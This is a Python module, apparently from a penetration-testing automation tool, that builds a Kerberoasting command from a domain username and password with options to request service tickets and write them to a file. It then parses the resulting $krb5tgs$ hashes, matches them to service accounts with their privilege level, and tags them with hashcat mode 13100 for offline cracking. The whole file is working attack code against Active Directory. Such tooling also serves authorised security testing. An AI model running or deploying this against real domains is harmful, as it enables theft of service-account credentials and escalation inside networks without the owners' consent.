from __future__ import annotations

from pathlib import Path
from typing import Any

KERBEROAST_HASHCAT_MODE = 13100


def build_kerberoast_command(
    *,
    binary: str,
    auth_context: dict[str, Any],
    domain: str,
    output_file: Path,
    domain_controller: str | None = None,
) -> list[str]:
    username = str(auth_context.get("username") or "").strip()
    password = str(auth_context.get("password") or "").strip()
    if not username or not password:
        raise ValueError("Kerberoast requires username and password")

    if "\\" in username:
        username = username.split("\\", 1)[1].strip()
    elif "@" in username:
        username = username.split("@", 1)[0].strip()

    if not username:
        raise ValueError("Kerberoast requires a usable username")

    command = [
        binary,
        f"{domain}/{username}:{password}",
        "-request",
        "-outputfile",
        str(output_file),
    ]
    if domain_controller:
        command.extend(["-dc-ip", domain_controller])
    return command


def extract_kerberoast_records(
    lines: list[str],
    *,
    candidate_accounts: list[dict[str, Any]],
    target: str,
) -> list[dict[str, Any]]:
    records: list[dict[str, Any]] = []
    account_indexes: dict[str, dict[str, Any]] = {}
    for account in candidate_accounts:
        account_name = str(account.get("account_name") or "").strip()
        principal = str(account.get("user_principal_name") or "").strip().lower()
        if account_name:
            account_indexes[account_name.lower()] = account
        if principal:
            account_indexes[principal] = account

    for raw_line in lines:
        line = str(raw_line or "").strip()
        if not line or not line.startswith("$krb5tgs$"):
            continue
        matched_account = None
        for key, account in account_indexes.items():
            if key and key in line.lower():
                matched_account = account
                break
        if matched_account is None:
            continue
        records.append(
            {
                "target": target,
                "account_name": str(matched_account.get("account_name") or "").strip(),
                "user_principal_name": (
                    str(matched_account.get("user_principal_name") or "").strip() or None
                ),
                "service_principal_names": list(
                    matched_account.get("service_principal_names") or []
                ),
                "privilege_level": str(
                    matched_account.get("privilege_level") or "standard"
                ).strip()
                or "standard",
                "hash": line,
                "hashcat_mode": KERBEROAST_HASHCAT_MODE,
                "source": "kerberoast",
            }
        )
    return records
